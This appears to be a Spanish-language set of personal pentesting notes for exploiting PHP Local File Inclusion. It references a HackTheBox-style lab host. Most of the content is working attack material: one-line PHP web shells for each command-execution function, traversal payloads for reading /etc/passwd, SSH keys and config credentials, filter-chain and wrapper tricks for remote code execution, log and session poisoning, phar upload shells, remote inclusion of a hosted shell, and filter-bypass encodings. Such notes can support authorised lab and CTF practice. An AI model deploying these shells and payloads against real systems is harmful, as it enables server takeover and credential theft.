# Funciones deshabilitadas

Es muy posible que se desactiven ciertas funciones como `system()` en php, esto lo podemos ver en la sección ***disabled functions***, alternativamente podemos usar [este repositorio en GitHub](https://github.com/teambi0s/dfunc-bypasser) para determinar que función podemos usar:

```python
### Meter el conte
curl -s -H 'Special-Dev: only4dev' 'http://dev.siteisup.htb/?page=phar://uploads/05bbeea18fa1e12c8f589e904b564ef3/test.txt/evil'  > out

### Sacar las funcioens habilitadas para ejecutar codigo
python2 dfunc-bypasser.py --file out
```

### system

```php
<?php system($_GET['cmd']); ?>
```

### passthru

```php
<?php passthru($_GET['cmd']); ?>
```

### shell_exec

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

### backticks

```php
<?php echo `$_GET[cmd]`; ?>
```

### exec

```php
<?php exec($_GET['cmd'], $out); echo implode("\n", $out); ?>
```

### popen

```php
<?php $h = popen($_GET['cmd'], "r"); while(!feof($h)) echo fread($h, 4096); pclose($h); ?>
```

### proc_open

```php
<?php
$d = [1 => ["pipe","w"], 2 => ["pipe","w"]];
$p = proc_open($_GET['cmd'], $d, $pipes);
echo stream_get_contents($pipes[1]);
proc_close($p);
?>
```

### pcntl_exec

```php
<?php pcntl_exec("/bin/sh", ["-c", $_GET['cmd']]); ?>
```

----
# Sin seguridad

#### Confirmar y mapear el LFI

- [ ] Traversal básico: `../../../../etc/passwd`. 

- [ ] Ruta absoluta directa: `/etc/passwd`.

- [ ] Leé el código de la propia app: (`index.php`, `config.php`) `php://filter/convert.base64-encode/resource=index.php`: No puede estarse concatenando nada por detras, EJ: 

```python
<?php include('/var/www/html/' . $_GET['page'])  ?>
```


#### Archivos interesantes

- [ ] Credenciales: `config.php`, `wp-config.php`, `.env`, `database.yml`, `settings.py`.

- [ ] Claves: `/home/<user>/.ssh/id_rsa`, `authorized_keys`.

- [ ] Info del sistema: `/etc/passwd`, historial (`.bash_history`, `.mysql_history`), `/etc/hosts`


#### Wrappers PHP

- [ ] `php://filter/convert.base64-encode/resource=index.php` → leer código fuente PHP sin que se ejecute. Fundamental para la revisión de código.

- [ ] **PHP filter chains para RCE**: 

```python
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>' 
```

- [ ] `data://text/plain;base64,<payload>` → ejecución directa si `allow_url_include` está en On

- [ ] `expect://id` si la extensión expect está cargada.

- [ ] `zip://` y `phar://` cuando podés subir un archivo comprimido/serializado.

- [ ] `https://` y `http://` hacia un servidor python hosteando shell.php, para RFI -> RCE 


#### LFI → RCE por "poisoning"
 
 - [ ] **Log poisoning**: inyectá PHP en un campo que quede logueado (User-Agent, referer) e incluí el log:
	 - `/var/log/apache2/access.log`, `error.log`, `/var/log/nginx/access.log`
    - `/var/log/auth.log` vía usuario SSH malicioso
    - `/var/log/mail`, `/var/log/vsftpd.log` según servicio.

- [ ] **Session poisoning**: controlá datos que caigan en `/var/lib/php/sessions/sess_<PHPSESSID>` y luego incluílo.

- [ ] **Upload + include**: si hay subida de archivos (aunque valide extensión), subí algo con PHP embebido y luego inclúílo por LFI.


#### /proc y descriptores

- [ ] `/proc/self/environ` (si loguea User-Agent en el entorno).

- [ ] `/proc/self/fd/0..N` para pescar descriptores abiertos.

- [ ] `/proc/self/cmdline`, `/proc/self/status` para reconocimiento.


#### Windows (si el objetivo es IIS/Windows)

- [ ] `C:\Windows\win.ini`, `\boot.ini`.

- [ ] Logs de IIS, y wrappers/UNC paths si aplica`\\{nuestraip}\{cualquiercosa}` (Usar responder `responder -I eth0 -d -w -v`).

### Bypasses cuando "sin protección" no es tan sin protección

- [ ] Null byte `%00` (solo PHP < 5.3.4, pero anotalo por si el lab es viejo).

- [ ] Doble encoding y encoding de `../` (`%2e%2e%2f`, `..%252f`).

- [ ] Truncamiento de path (paths muy largos, `...././`) en versiones antiguas.

- [ ] Filtros que solo eliminan `../` una vez → `....//`.

- [ ] Wrappers para saltear el append de extensión (`php://filter/...&`).


----

# Con proteccion:  Extension agregada al final `.php`

----
- [ ] Null byte `%00` (solo PHP < 5.3.4, pero anotalo por si el lab es viejo).

- [ ] Leé el código de la propia app: (`index.php`, `config.php`,  `wp-config.php`, `settings.php`) `php://filter/convert.base64-encode/resource=index.php

- [ ] **PHP filter chains para RCE**: 

```python
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>' 
```


- [ ] **Upload + include**: si hay subida de archivos, subir `shell.php`

#### Subida de archivos `.php` restringida

- [ ] Revisar [[Checklist bypass en subida de archivos]]

- [ ] `zip://` y `phar://` cuando podés subir un archivo comprimido/serializado:

```python
### Crear shell.php
echo '<?php phpinfo(); echo "PWNED"; ?>' > shell.php
### Comprimir 
zip info.jpeg info.php 
### Subir

### Llamar:
https://URL/?page=phar://[archive path]/shell
```

#### `allow_url_include` Habiltado


- [ ] `data://text/plain;base64,<payload>` → ejecución directa si `allow_url_include` está en On

- [ ] `https://` y `http://` hacia un servidor python hosteando shell.php, para RFI -> RCE 

# Con protección: Variado


- [ ] Null byte `%00` (solo PHP < 5.3.4, pero anotalo por si el lab es viejo).

- [ ] Doble encoding y encoding de `../` (`%2e%2e%2f`, `..%252f`).

- [ ] Truncamiento de path (paths muy largos, `...././`) en versiones antiguas.

- [ ] Filtros que solo eliminan `../` una vez → `....//`.




